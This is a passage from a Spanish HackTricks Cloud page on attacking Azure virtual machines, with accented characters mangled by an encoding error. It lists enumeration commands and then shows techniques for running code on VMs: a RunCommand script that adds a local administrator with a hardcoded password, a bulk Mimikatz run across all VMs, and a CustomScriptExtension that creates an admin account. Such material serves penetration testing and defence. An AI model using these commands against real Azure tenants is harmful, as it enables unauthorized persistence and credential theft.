# Az - M谩quinas Virtuales

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci贸n b谩sica

Las m谩quinas virtuales de Azure son uno de varios tipos de recursos inform谩ticos escalables bajo demanda que ofrece Azure. Por lo general, se elige una m谩quina virtual cuando se necesita m谩s control sobre el entorno inform谩tico que las otras opciones ofrecen. Este art铆culo le proporciona informaci贸n sobre lo que debe considerar antes de crear una m谩quina virtual, c贸mo crearla y c贸mo administrarla.

## Enumeraci贸n

```powershell
# Obtener VMs legibles
Get-AzVM | fl
# Listar VMs en ejecuci贸n
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Obtener interfaz y direcci贸n IP
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

# Obtener extensiones instaladas
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Obtener el nombre del conector de red de la VM
Get-AzNetworkInterface -Name <name> # Obtener informaci贸n del conector de red (como la IP)
```

## **Ejecutar comandos en una VM**

### **Comando Ejecutar**

```powershell
# El permiso que permite esto es Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose
## Otra forma
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose

# Contenido del script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Intentar ejecutar en todas las m谩quinas
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

### **Extensi贸n de script personalizado**

Las extensiones de m谩quina virtual (VM) de Azure son **peque帽as aplicaciones** que proporcionan configuraci贸n posterior a la implementaci贸n y tareas de automatizaci贸n en **VM de Azure**. Por ejemplo, si una m谩quina virtual requiere la instalaci贸n de software, protecci贸n antivirus o la capacidad de ejecutar un script dentro de ella, puede usar una extensi贸n de VM.

Por lo tanto, si tiene acceso para escribirlo, puede ejecutar c贸digo arbitrario:

```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```

### DesiredConfigurationState

**DesiredConfigurationState (DSC)** es similar a Ansible, pero es una herramienta dentro de PowerShell que permite configurar un host a trav茅s del c贸digo. DSC tiene su propia extensi贸n en Azure que permite la carga de archivos de **configuraci贸n** de DSC. Los archivos de configuraci贸n de DSC son bastante quisquillosos en cuanto a la sintaxis, sin embargo, la extensi贸n de DSC es muy cr茅dula y ejecutar谩 **ciegamente cualquier comando** siempre y cuando siga un cierto formato, como se muestra en la figura 5.

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Esto se puede hacer a trav茅s de la funci贸n de PowerShell de **Az [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0)**. La extensi贸n de DSC requiere un archivo **.PS1** con una **funci贸n** y **empaquetado** en un archivo **.zip**. Dado que esto no es realmente la sintaxis correcta de DSC, el estado de la extensi贸n se leer谩 como "fallido", sin embargo, el c贸digo se ejecutar谩. El problema con esto es que no hay salida del comando, ya que el estado se sobrescribe con el mensaje de falla.

### Definiciones de aplicaciones de VM

El recurso [Aplicaciones de VM](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) es una forma de **implementar aplicaciones versionadas de manera repetible** en una VM de Azure. Por ejemplo, si crea un **programa** y lo implementa en todas las VM de Azure como la versi贸n 1.0, una vez que **actualice** el programa a la versi贸n 1.1, puede usar la misma Aplicaci贸n de VM para **crear otra definici贸n** y enviar la actualizaci贸n a cualquier VM.\
Poder **enviar una aplicaci贸n** a una VM significa que es otra v铆a para la **ejec